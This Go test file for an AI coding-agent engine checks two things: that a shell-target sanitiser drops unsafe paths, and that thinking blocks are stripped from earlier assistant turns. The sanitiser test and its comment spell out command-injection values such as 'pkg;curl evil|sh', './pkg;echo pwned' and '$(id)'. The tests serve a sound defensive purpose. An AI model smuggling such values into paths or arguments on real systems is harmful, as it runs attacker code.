package engine

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/liuzhixin405/cove-agent/internal/api"
)

// The verify gate splices package paths and test files from the model's own
// writes into a shell line; a directory named `pkg;curl evil|sh` ran a
// second command and `my tool` split into two packages (a FAIL that sent
// the model back). Only plain path characters pass.
func TestShellSafeTargetsDropUnsafePaths(t *testing.T) {
	got := shellSafeTargets([]string{"./pkg;echo pwned", "./my tool", "./ok/pkg_1-2.v3", "tests/test_a;x.py", "./a/../b", "$(id)", "."})
	if strings.Join(got, "|") != "./ok/pkg_1-2.v3|." {
		t.Fatalf("shellSafeTargets = %q", got)
	}
}

// After masking or compaction rewrote the history, thinking blocks of earlier
// assistant turns go (Anthropic ignores them); the last assistant turn keeps
// its blocks, which the API requires when its tool results follow.
func TestStripThinkingBlocksKeepsTheLastAssistantTurn(t *testing.T) {
	block := func(s string) []json.RawMessage {
		return []json.RawMessage{json.RawMessage(`{"type":"thinking","thinking":"` + s + `"}`)}
	}
	msgs := []api.Message{
		{Role: "user", Content: "q"},
		{Role: "assistant", Content: "a1", ThinkingBlocks: block("one")},
		{Role: "user", Content: "q2"},
		{Role: "assistant", ToolCalls: []api.ToolCall{{ID: "t", Name: "read"}}, ThinkingBlocks: block("two")},
		{Role: "tool", ToolCallID: "t", Content: "ok"},
	}
	stripThinkingBlocks(msgs)
	if len(msgs[1].ThinkingBlocks) != 0 {
		t.Fatal("earlier assistant turn kept its thinking blocks")
	}
	if len(msgs[3].ThinkingBlocks) != 1 || !strings.Contains(string(msgs[3].ThinkingBlocks[0]), "two") {
		t.Fatal("last assistant turn lost its thinking blocks")
	}
}
